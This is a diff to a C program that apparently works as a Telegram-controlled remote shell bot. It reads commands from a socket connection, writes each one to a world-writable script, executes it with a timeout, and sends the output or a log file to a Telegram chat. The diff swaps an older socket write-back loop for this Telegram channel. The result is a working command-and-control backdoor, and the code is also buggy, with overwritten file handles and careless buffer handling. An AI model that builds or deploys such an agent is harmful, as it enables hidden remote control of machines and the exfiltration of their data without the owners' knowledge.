@@ -1,5 +1,6 @@
 #include "include/common.h"
 #include "Telegram/telegram.h"
+#include "Telegram/common.h"
 
 
 #include<sys/socket.h>
@@ -61,82 +62,6 @@ int main(int argc , char *argv[])
             usleep(3000000);
         }
     }
-
-    //Send some data (client --> server)
-
-    while(1) {
-        //Receive a reply from the server(Server have massage to client and client read this message)
-        //bzero(message,2000) --> set a byte string (message)
-        bzero(message,2000);
-        //If read(socket_desc, message , 2000 ) < 0 it means Server didn't send anything to client
-        if( read(socket_desc, message , 2000 ) < 0)
-        {
-            printf("recieve failed");
-        }
-
-        //check message block to change some command
-        changecommand(message);
-        printf("%s", message);
-
-        //combine all message_box
-        FILE *fp;
-        fp = fopen("server-message.sh", "w");
-        fputs(message, fp);
-        fclose(fp);
-
-        
-        char mode[] = "0777";
-        char buffer[100] = "server-message.sh";
-        int i;
-        i = strtol(mode, 0, 8);
-        if (chmod (buffer,i) < 0)
-        {
-            fprintf(stderr, "%s: error in chmod(%s, %s) - %d (%s)\n",
-                    argv[0], buffer, mode, errno, strerror(errno));
-            exit(1);
-        }
-
-
-        //Send to server
-        //After Client has recieve form server, Client write message back to server
-        // printf("--- Sending init --- \n");
-        char tmp[250],buf[250], messageget[250];
-
-        //use popen in order to pointer to the first memory location that hold the results (results ---> value of message)
-        fp = fopen("server-message.sh", "r");
-        fgets(messageget, 250, fp);
-        fp = popen(messageget, "r");
-
-        //fgets use to read next input line to keep in charactor array with value MAXLINE - 1
-        while (fgets(buf, 200, fp))
-        {
-            // printf("%s:\n",buf);
-            //If write(socket_desc , buf , strlen(buf)) < 0 it means client didn't send anything to server
-            if( write(socket_desc , buf , strlen(buf)) < 0)
-            {
-                printf("Send failed");
-                return 1;
-            }
-            bzero(message,2000);
-            bzero(tmp,200);
-            bzero(buf,200);
-        }
-        fclose(fp);
-
-        //Stop sending
-        //After Client send message to server
-        // printf("Stop sent..\n");
-        usleep(1000000); //1second
-        sprintf(message,"%s",OP_STOP);
-
-        // printf("%s\n",message);
-        if( write(socket_desc , message ,5) < 0)
-        {
-            printf("Send failed");
-            return 1;
-        }
-        bzero(message,2000);
-        bzero(tmp,200);
     char chat_id[60];
     char chat_text[4098];
     bzero(chat_id,60);        
@@ -145,98 +70,72 @@ int main(int argc , char *argv[])
         printf("recieve failed");
     }
     printf("%s\n",chat_id);
-    bzero(chat_id,60);
+
     bzero(chat_text,4000);        
     if( read(socket_desc, chat_text , 4000 ) < 0)
     {
         printf("recieve failed");
     }
-    printf("%s\n",chat_text);
-    bzero(chat_text,4000);
+    // printf("%s\n",chat_text);
+    
+    changecommand(chat_text);
+    printf("%s\n", chat_text);
+    //combine all message_box
+    FILE *fp;
+    fp = fopen("server-message.sh", "w");
+    fputs(chat_text, fp);
+    fclose(fp);
+    char mode[] = "0777";
+    char buffer[100] = "server-message.sh";
+    int i;
+    i = strtol(mode, 0, 8);
+    if (chmod (buffer,i) < 0)
+    {
+        fprintf(stderr, "%s: error in chmod(%s, %s) - %d (%s)\n",
+        argv[0], buffer, mode, errno, strerror(errno));
+        exit(1);
+    }
 
-    // while(1) {
-    //     //Receive a reply from the server(Server have massage to client and client read this message)
-    // //bzero(message,2000) --> set a byte string (message)
-    //     bzero(message,2000);
-    //     //If read(socket_desc, message , 2000 ) < 0 it means Server didn't send anything to client
-    //     if( read(socket_desc, message , 2000 ) < 0)
-    //     {
-    //         printf("recieve failed");
-    //     }
+    fp = popen("timeout 10 ./server-message.sh > exe.log", "r");
+    char buf[2000];
+    bzero(buf,1999);
+    fp = fopen("exe.log","r");
 
-    //     //check message block to change some command
-    //     // changecommand(message);
-    //     printf("%s", message);
-    //     //combine all message_box
-    //     FILE *fp;
-    //     fp = fopen("server-message.sh", "w");
-    //     fputs(message, fp);
-    //     fclose(fp);
-    //     char mode[] = "0777";
-    //     char buffer[100] = "server-message.sh";
-    //     int i;
-    //     i = strtol(mode, 0, 8);
-    //     if (chmod (buffer,i) < 0)
-    //     {
-    //         fprintf(stderr, "%s: error in chmod(%s, %s) - %d (%s)\n",
-    //                 argv[0], buffer, mode, errno, strerror(errno));
-    //         exit(1);
-    //     }
-    //     //Send to server
-    //     //After Client has recieve form server, Client write message back to server
-    //     // printf("--- Sending init --- \n");
-    //     char tmp[1024],buf[1024], messageget[1024];
-    //     //use popen in order to pointer to the first memory location that hold the results (results ---> value of message)
-    //     // fp = fopen(, "r");
-    //     // fgets(messageget, 1024, fp);
-    //     fp = popen("timeout 10 ./server-message.sh &> exe.log", "r");
-    //     if(check_exe_len())
-    //     {
-    //         while (fgets(buf, 1024, fp))
-    //         {
-    //             // printf("%s:\n",buf);
-    //             //If write(socket_desc , buf , strlen(buf)) < 0 it means client didn't send anything to server
-    //             if( write(socket_desc , buf , 1024) < 0)
-    //             {
-    //                 printf("Send failed");
-    //                 return 1;
-    //             }
-    //             bzero(message,2000);
-    //             bzero(tmp,1024);
-    //             bzero(buf,1024);
-    //         }
-    //     }
-    //     else{
-    //         //sending_exe.log
-    //         printf("send exe.log\n");
-    //     }
-    //     fclose(fp);
-    //     //Stop sending
-    //     //After Client send message to server
-    //     // printf("Stop sent..\n");
-    //     usleep(1000000); //1second
-    //     sprintf(message,"%s",OP_STOP);
-    //     // printf("%s\n",message);
-    //     if( write(socket_desc , message ,5) < 0)
-    //     {
-    //         printf("Send failed");
-    //         return 1;
-    //     }
-    //     bzero(message,2000);
-    //     bzero(tmp,200);
-    // }
-        
-    // printf("\n");
-     
-}
+    fseek(fp, 0, SEEK_END);
+    if(ftell(fp) < 1024)
+    {
+        rewind(fp);
+        if(fp != NULL){
+            while(!feof(fp)){
+                memset(buf, 0, sizeof(buf));
+                int bufflen = fread(buf, 1, sizeof(buf), fp);
+                buf[bufflen] = 0;
+            }
+            fclose(fp);
+        }
+        // fgets(buf, 1024, fp);
+        //If write(socket_desc , buf , strlen(buf)) < 0 it means client didn't send anything to server
+        telegram_send_msg(chat_id, buf);
+        printf("%s\n", buf);
+        bzero(buf,1024);
+            
+    }
+    else{
+        //sending_exe.log
+        telegram_send_file(chat_id, "exe.log");
+        printf("send exe.log\n");
+    }
+        printf("wow");
+
+    fclose(fp);
 }
 void *changecommand(char *text) {
-    char text_build[1000], command_detail[500];
+    char text_build[4000], command_detail[500];
     int start_index, index = 0, length;
 
     strcpy(text_build, text);
     length = strlen(text);
-    memset(text, 0, 2000);
+    memset(text, 0, 4000);
     memset(command_detail, 0, 500);
 
     if(text_build[0] == '/') {
@@ -249,15 +148,15 @@ void *changecommand(char *text) {
         text[index] = text_build[start_index];
         index += 1;
         if(strcmp(text, "shell ") == 0) {
-            memset(text, 0, 1000);
+            memset(text, 0, 4000);
             index = 0;
-            strcpy(command_detail, "Exec shell commands with timeout.");
+            // strcpy(command_detail, "Exec shell commands with timeout.");
         }else if(strcmp(text, "mvbot ") == 0) {
-            memset(text, 0, 1000);
+            memset(text, 0, 4000);
             index = 0;
             strcpy(command_detail, "Move bot to custom location.");
         }else if(strcmp(text, "timeout ") == 0) {
-            memset(text, 0, 1000);
+            memset(text, 0, 4000);
             index = 0;
             strcpy(command_detail, "Set timeout for shell.");
         } else if(strcmp(text, "help") == 0) {
